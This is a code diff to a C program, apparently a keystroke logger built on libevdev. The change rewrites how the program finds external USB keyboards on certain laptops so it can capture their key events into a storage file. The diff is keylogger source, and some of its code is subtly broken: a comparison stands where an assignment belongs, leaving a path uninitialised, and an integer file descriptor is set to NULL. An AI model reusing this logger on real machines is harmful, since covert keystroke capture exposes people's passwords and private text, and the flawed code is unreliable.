@@ -102,6 +102,7 @@ void log_keys(key_package* key_package) {
   // open a device, as libevdev expects a file descriptor. You should have root
   // permissions
   struct libevdev* keyboard_dev;
+  struct libevdev* external_keyboard_dev;
   int rc;
 
   // get keyboard inputs event file
@@ -118,36 +119,51 @@ void log_keys(key_package* key_package) {
     exit(0);
   }
 
-  // check USB ports in the event they are external keyboards
-  int external1_fd = open("/dev/input/event25", O_RDONLY | O_NONBLOCK);
-  if (external1_fd < 0) {
-    printf("Nothing plugged into bottom right USB (closest to you)\n");
-  }
-  int external2_fd = open("/dev/input/event27", O_RDONLY | O_NONBLOCK);
-  if (external2_fd < 0) {
-    printf("Nothing plugged into left USB\n");
-  }
-  int external3_fd = open("/dev/input/event28", O_RDONLY | O_NONBLOCK);
-  if (external3_fd < 0) {
-    printf("Nothing plugged into top right USB\n");
+  // check the 3 USB ports in the event they are external keyboards
+  // On the sophomore laptops, 25 is the bottom right, 27 is the left, and 28 is the top right USB port
+  int external_fd;
+  for (size_t i = 0; i < 3; ++i) {
+    // TODO: replace with better implementation
+    char* event_path;
+    if (i == 0) {
+      event_path = "/dev/input/event25";
+    } else if (i == 1) {
+      event_path = "/dev/input/event27";
+    } else if (i == 2) {
+      event_path == "/dev/input/event28";
+    }
+    // printf("event path: %s\n", event_path);
+    external_fd = open(event_path, O_RDONLY | O_NONBLOCK);
+
+    if (external_fd < 0) {
+      printf("No device found for %s\n", event_path);
+      continue;
+    }
+    // check that the event is a keyboard. If so, exit this loop immediately
+    rc = libevdev_new_from_fd(external_fd, &external_keyboard_dev);
+    if (rc < 0) {
+      fprintf(stderr, "error with setting rc for %s: %d %s\n", event_path, -rc, strerror(-rc));
+      fclose(data_storage);
+      exit(0);
+    }
+    // check if the event represents a keyboard
+    if (libevdev_has_event_type(external_keyboard_dev, EV_KEY) == 1) {
+      printf("passed check 1\n");
+      if (libevdev_has_event_code(external_keyboard_dev, EV_KEY, KEY_A)) {
+        printf("%s is a keyboard\n", event_path);
+        break;
+      }
+    }
+
+    // if this is the third loop and there is no keyboard, set extrenal_fd = NULL
+    if (i == 2) {
+      printf("No external keyboards found.\n");
+      external_fd = NULL;
+    }
   }
 
-  // convert all to _____
-  if (libevdev_new_from_fd(external1_fd, &keyboard_dev) < 0) {
-    fprintf(stderr, "error with setting rc: %d %s\n", -rc, strerror(-rc));
-    fclose(data_storage);
-    exit(0);
-  }
+  printf("exited loop\n");
 
-  if (libevdev_has_event_type(external1_fd, EV_KEY) == 1) {
-    printf("external 1 has keys\n");
-  }
-  if (libevdev_has_event_type(keyboard_dev, EV_KEY) == 1) {
-    printf("external 1 has keys\n");
-  }
-  if (libevdev_has_event_type(keyboard_dev, EV_KEY) == 1) {
-    printf("external 1 has keys\n");
-  }
 
   while (1) {
     struct input_event ev;
